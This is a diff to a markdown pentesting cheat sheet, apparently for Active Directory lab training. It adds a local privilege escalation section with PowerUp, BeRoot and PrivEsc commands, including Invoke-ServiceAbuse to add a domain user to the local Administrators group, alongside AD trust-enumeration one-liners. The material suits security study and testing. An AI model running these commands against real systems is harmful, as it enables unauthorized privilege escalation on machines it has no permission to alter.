@@ -16,7 +16,7 @@ Import-Module .\ActiveDirectory\ActiveDirectory.psd1
 ```
 Link: ![AD Module](https://github.com/samratashok/ADModule)
 
-## Enumeration:
+# Enumeration:
 
 ### Enumeration Users:
 
@@ -145,4 +145,37 @@ Get-NetForestDomain -Verbose | Get-NetDomainTrust | ?{$_.TrustType -eq 'External
 ```
 (Get-ADForest).Domains                                                                                                 #Get all domains in the current forest
 (Get-ADForest).Domains | %{Get-ADTrust -Filter '(intraForest -ne $True) -and (ForestTransitive -ne $True)' -Server $_} #Maps only external trusts
+```
+
+# Local Privilege Escalation:
+
+## Using PowerUp:
+```
+. .\PowerUp.ps1
+```
+Link: ![PowerUp](https://github.com/PowerShellMafia/PowerSploit/blob/master/Privesc/PowerUp.ps1)
+## BeRoot
+```
+.\beRoot.exe
+```
+Link: ![BeRoot](https://github.com/AlessandroZ/BeRoot/tree/master/Windows)
+## PrivEsc
+```
+. .\privesc.ps1
+```
+Link: ![PrivEsc](https://github.com/enjoiz/Privesc/blob/master/privesc.ps1)
+
+### Enumeration Users:
+
+- **With PowerUp:**
+```
+Invoke-AllChecks                                                         #Performs all checks
+Get-ServiceUnquoted -Verbose                                             #Get services with unquoted paths and a space in their name.
+Get-ModifiableServiceFile -Verbose                                       #Get services where the current user can write to its binary path or change arguments to the binary
+Get-ModifiableService -Verbose                                           #Get the services whose configuration current user can modify
+Invoke-ServiceAbuse -Name 'software_xxx' -UserName 'corporate\student01' #Let's add our current domain user to the local Administrators group 
+```
+- **With PrivEsc:**
+```
+Invoke-Privesc                                        #Performs all checks
 ```
